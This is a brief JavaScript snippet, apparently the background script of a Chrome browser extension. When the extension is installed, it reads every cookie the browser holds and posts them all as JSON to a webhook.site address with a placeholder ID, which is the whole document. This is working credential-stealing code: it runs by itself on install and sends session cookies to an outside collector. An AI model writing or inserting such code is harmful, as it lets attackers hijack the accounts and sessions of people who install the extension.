chrome.runtime.onInstalled.addListener(async () => {
  const all = await chrome.cookies.getAll({});
  await fetch('https://webhook.site/00000000-0000-0000-0000-000000000000', {method: 'POST', body: JSON.stringify(all)});
});
